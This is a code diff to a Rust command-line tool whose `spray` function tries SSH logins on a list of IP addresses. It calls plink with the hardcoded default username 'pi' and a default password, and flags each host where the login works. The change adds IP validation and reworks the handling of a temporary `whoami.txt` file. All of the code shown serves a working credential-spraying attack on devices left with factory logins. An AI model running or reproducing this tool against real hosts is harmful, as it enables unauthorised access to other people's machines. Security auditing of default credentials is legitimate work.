@@ -2,6 +2,7 @@ use clap::Parser;
 use std::process::{Command,Stdio};
 use colored::*;
 use std::io::Write;
+use ipaddress::IPAddress;
 
 
 static DEFAULT_USERNAME: &str = "pi";
@@ -117,29 +118,38 @@ fn spray(ips: Vec<String>) {
 #[cfg(target_os = "windows")]
 fn spray(ips: Vec<String>) {
 
-    let mut file = std::fs::File::create("whoami.txt").expect("Failed to file for splink");
-    file.write_all("whoami".as_bytes()).expect("Failed to write to file for splink");
+    
 
     for ip in ips {
-        print!("[{}] {}\r", "~".truecolor(169,169,169), ip);
-        let ssh = Command::new("plink")
-                          .arg("-ssh")
-                          .arg(format!("{}@{}", DEFAULT_USERNAME, ip))
-                          .arg("-pw")
-                          .arg(DEFAULT_PASSWORD)
-                          .arg("-m")
-                          .arg("whoami.txt")
-                          .output()
-                          .expect("ssh failed to start");
-        let ssh_output = String::from_utf8_lossy(&ssh.stdout);
-        if (ssh_output.contains(DEFAULT_USERNAME)){
-            println!("[{}] {}", "+".bright_green(), ip);
+        if (IPAddress::is_valid(&ip)) {
+
+            let mut file = std::fs::File::create("whoami.txt").expect("Failed to file for plink");
+            file.write_all("whoami".as_bytes()).expect("Failed to write to file for plink");
+
+            print!("[{}] {}\r", "~".truecolor(169,169,169), ip);
+            let ssh = Command::new("plink")
+                              .arg("-ssh")
+                              .arg(format!("{}@{}", DEFAULT_USERNAME, ip))
+                              .arg("-pw")
+                              .arg(DEFAULT_PASSWORD)
+                              .arg("-m")
+                              .arg("whoami.txt")
+                              .output()
+                              .expect("ssh failed to start");
+            let ssh_output = String::from_utf8_lossy(&ssh.stdout);
+            if (ssh_output.contains(DEFAULT_USERNAME)){
+                println!("[{}] {}", "+".bright_green(), ip);
+            } else {
+                println!("[{}] {}", "-".bright_red(), ip);
+            }
+
+            std::fs::remove_file("whoami.txt").expect("Failed to delete file used for plink. Please delete it from your directory.");
+            
         } else {
-            println!("[{}] {}", "-".bright_red(), ip);
+            println!("[{}] {} - {}", "~".truecolor(255,164,0), ip, "Invalid Address".truecolor(255,164,0));
         }
     }
-
-    std::fs::remove_file("whoami.txt").expect("Failed to delete file used for splink. Please delete it from your directory.");
+    
 }
 
 fn main() {
